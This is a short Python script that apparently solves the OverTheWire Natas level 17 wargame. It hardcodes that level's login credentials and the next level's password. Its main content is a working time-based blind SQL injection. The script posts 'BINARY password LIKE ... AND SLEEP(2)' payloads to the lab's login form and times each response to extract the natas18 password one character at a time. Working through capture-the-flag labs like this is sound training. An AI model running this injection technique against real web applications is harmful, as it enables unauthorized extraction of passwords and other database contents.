#!/usr/bin/python
import requests
from string import *
from time import *

username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
url = f'http://{username}.natas.labs.overthewire.org/'

leakedpass = ''
characters = ascii_letters + digits
# password for this level = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'

while True:
	found = False
	for ch in characters:
		sql = f'natas18" AND BINARY password LIKE "{leakedpass}{ch}%" AND SLEEP(2) # '
		start_time = time()
		response = requests.post(url ,data = {"username": sql} ,auth = (username, password))
		elapsed = time() - start_time
		print(f"TRYING  {ch}")
		if elapsed > 1:
			found = True
			leakedpass += ch
			print(f"password: {leakedpass}")
			break

	if not found:
		break
	
